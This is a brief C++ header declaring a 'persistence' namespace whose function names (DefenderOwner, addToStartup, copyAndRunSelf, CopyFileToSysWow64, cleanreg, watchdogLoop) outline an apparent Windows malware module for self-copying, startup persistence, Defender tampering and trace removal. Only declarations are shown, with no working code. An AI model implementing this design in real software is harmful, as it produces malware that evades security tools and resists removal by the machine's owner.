#include "include.h"

namespace persistence {

bool isUserAdmin();
void DefenderOwner();
bool checkAndCreateFile(const std::string& filename);
void addToStartup();
void reset();
void restartSystem();
void restartAsAdmin();
int copyAndRunSelf();
void cleanreg();
void cleanfile();
std::string getDiskSerial();
void CopyFileToSysWow64(std::string destPath, std::string filename);
void StopExe();
bool isProcessRunning(const char* exeName);
void watchdogLoop();

} // namespace persistence

